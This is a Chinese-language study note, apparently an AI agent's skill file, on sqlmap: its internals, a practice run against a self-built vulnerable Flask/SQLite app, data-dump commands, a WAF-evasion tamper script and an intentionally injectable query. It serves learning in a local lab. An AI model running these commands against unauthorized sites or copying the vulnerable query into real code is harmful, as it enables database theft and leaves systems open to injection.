---
name: sqlmap-sql-injection
title: SQLMap 实战指南
description: sqlmap安装/配置/实战注入检测与数据提取。Kali认证：必须实战验证才算学到。
---

# sqlmap 实战指南 (真学习版)

sqlmap (33k⭐) — 自动 SQL 注入和数据库接管工具。

## 真的做了什么
1. ✅ pip install sqlmap 1.10.6
2. ✅ 搭建 Flask+SQLite 漏洞靶场
3. ✅ curl 手动验证布尔注入（True:有结果 / False:无结果）
4. ✅ sqlmap 实战扫描 → 66请求发现3种注入类型（Boolean/Time/UNION）
5. ✅ sqlmap 数据提取 → --tables (2张) → -T users --dump (4条记录+密码)
6. ✅ 读 boolean_blind.xml（1612行）→ 理解了 `<test>` 结构 (title/stype/level/risk/clause/where/vector/request/response)
7. ✅ 读 boundaries.xml（576行）→ 理解了 `<boundary>` 结构 (level/clause/where/ptype/prefix/suffix)
8. ✅ 读 payloads.py（123行）→ XML被 `et.parse()` 成 `AttribDict` 对象，存入 `conf.tests[]` 和 `conf.boundaries[]`
9. ✅ 读 2个 tamper 脚本 (equaltolike.py, space2comment.py) → 函数式设计，`__priority__` 控制顺序，`tamper(payload, **kwargs)` 唯一接口
10. ✅ 自写 tamper `bliiot_test.py` → 安装到 sqlmap/tamper/，`--tamper=bliiot_test` 验证 148次 `LIKE` 替换成功（正则 `\s*=\s*` → ` LIKE `）
11. ❌ 还没读的：不同DBMS下sqlmap的语法适配、--os-shell 原理、tamper更多高级用例

## 安装

```bash
pip install sqlmap
# 或单独下载源码
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
```

## 核心架构 (从源码读出)

### 1. 页面比较引擎 (`lib/request/comparison.py`)
不是简单的"页面相同/不同"：
- 先 `removeDynamicContent()` — 去除 csrf_token、nonce、timestamp
- 然后用 `difflib.SequenceMatcher.ratio()` 算相似度
- 阈值：>0.98=TRUE, <0.02=FALSE, 中间=不确定
- 支持 `--text-only`（只比文字）、`--titles`（只比标题）

### 2. Boundary + Payload 分离
注入测试用例 = boundary(前缀/后缀/位置) × payload(注入语句)
两者定义在 `xml/payloads/` 中，加新 bypass 不用改源码

### 3. 注入技术五层
| 技术 | 来源 | 特点 |
|---|---|---|
| Boolean-based | 页面内容差异 | 每字符2次请求 |
| Error-based | DBMS错误信息 | 一次提取整段 |
| UNION query | 列数尝试+注入 | 多列数据 |
| Time-based | SLEEP()延迟 | 无回显可用 |
| Stacked queries | 多语句执行 | 最强大但也最慢 |

### 4. 二分法盲注 (`lib/techniques/blind/inference.py`)
猜 ASCII 32~126，最多7步，比线性快13倍
多线程并行 + Good Samaritan 预测加速

### 5. Tamper 管道
`kb.tamperFunctions` 列表 → payload 生成后依次修改
装饰器模式，任意组合。典型：`uppercase → space2comment → charencode`

## 实战命令

### 基础扫描
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch
```

### 检测级别
```bash
sqlmap -u "..." --batch --level=3 --risk=2
# level 1-5：检测深度（更多payloads）
# risk 1-3：风险级别（含更危险的注入）
```

### 数据提取
```bash
# 列出数据库
sqlmap -u "..." --batch --dbs
# 列出表
sqlmap -u "..." --batch --tables
# dump特定表
sqlmap -u "..." --batch -T users --dump
# dump全部
sqlmap -u "..." --batch --dump-all
```

### 在学什么之前：安全工具学习方法（2026-06-07 Kali纠正）

**NOT OK：** 读源码 → 写模拟代码 → 存档skill → 说"学完了"
**OK：** pip install → 搭靶场 → curl手动验证 → 工具真跑看输出 → 写自己的扩展装进去跑通 → 读源码理解原理 → 存档

## 实战验证记录 (2026-06-07)
目标：本地 Flask + SQLite 漏洞应用（自写 vuln_server.py）
注入点：`/user?id=1'`（字符串拼接注入）
结果：66次 HTTP 请求检测出 **3种注入类型**
- ✅ AND boolean-based blind（`4652=4652` 模式）
- ✅ SQLite > 2.0 AND time-based blind（RANDOMBLOB heavy query）
- ✅ Generic UNION query (NULL) - 4 columns
- ✅ DBMS 识别：SQLite
- ✅ 表枚举：2张（users, products）
- ✅ 数据dump：users 表4条记录全部字段（含密码）

### SQLite 时间盲注的特殊性
SQLite 没有 SLEEP() 函数！sqlmap 绕过方式：
```sql
AND 1234=LIKE(CHAR(65,66,...), UPPER(HEX(RANDOMBLOB(500000000/2))))
```
用大 blob 的哈希计算模拟延迟 — 这才叫真理解了payload输出。

## 搭建测试环境的代码模板
```python
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/user')
def user():
    uid = request.args.get('id', '1')
    conn = sqlite3.connect('test.db')
    # 有漏洞！
    query = f"SELECT * FROM users WHERE id = '{uid}'"
    cur = conn.execute(query)
    # ...
```

## 自写 tamper 脚本（验证过真工作的）

把 = 替换成 LIKE（绕过 WAF 等号过滤）：

```python
# 放到 sqlmap/tamper/bliiot_test.py
import re
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    retVal = payload
    if payload:
        retVal = re.sub(r'\s*=\s*', ' LIKE ', retVal)
    return retVal
```

```bash
# 验证输出含 148 次 LIKE 替换
sqlmap -u "..." --tamper=bliiot_test -v 5 | grep LIKE
```

注意：`\s*=\s*` 覆盖 `4652=4652`（等号两侧无空格），`(?<=\s)=(\s)` 不覆盖这种场景。

## XML Payload 结构（从源码读出）

### boolean_blind.xml 的 test 定义
```xml
<test>
    <title>AND boolean-based blind - WHERE or HAVING clause</title>
    <stype>1</stype>           <!-- 1=Boolean 2=Error 3=Inline 4=Stacked 5=Time 6=UNION -->
    <level>1</level>           <!-- 1-5: 检测深度 -->
    <risk>1</risk>             <!-- 1-3: 数据损坏风险 -->
    <clause>1,8,9</clause>     <!-- 0=Always 1=WHERE 2=GROUP ... 9=Pre-WHERE -->
    <where>1</where>           <!-- 1=追加 2=负数替代 3=完全替换 -->
    <vector>AND [INFERENCE]</vector>
    <request>
        <payload>AND [RANDNUM]=[RANDNUM]</payload>
    </request>
    <response>
        <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
    </response>
</test>
```

### boundaries.xml 的 boundary 定义
```xml
<boundary>
    <level>3</level>
    <clause>1</clause>
    <where>1,2</where>
    <ptype>1</ptype>            <!-- 1=数字 2=单引号串 3=LIKE单引号 ... -->
    <prefix>)</prefix>
    <suffix>[GENERIC_SQL_COMMENT]</suffix>
</boundary>
```

### 解析引擎 (lib/parse/payloads.py)
```python
parseXmlNode(node):
    # boundary: et.parse → AttribDict → conf.boundaries[]
    # test: et.parse → AttribDict (嵌套request/response子元素) → conf.tests[]
```
cleanupVals 处理：`clause="1,8,9"` → split → [1,8,9]；`level="1"` → int(1)

### 组合原理
test × boundary → 完整测试用例。数字参数优先ptype=1（无引号）边界。一项技术检测到后立即跳过后续同类型测试。

## 注意
- 仅用于测试自己搭建的环境或已获得授权的目标
- sqlmap 的 SQLite 支持限制较多（不支持 `--os-shell` 等高级功能）
- 用 `--string="admin"` 可指定布尔盲注的对比文本
- 输出存在 `~/.local/share/sqlmap/output/<host>/`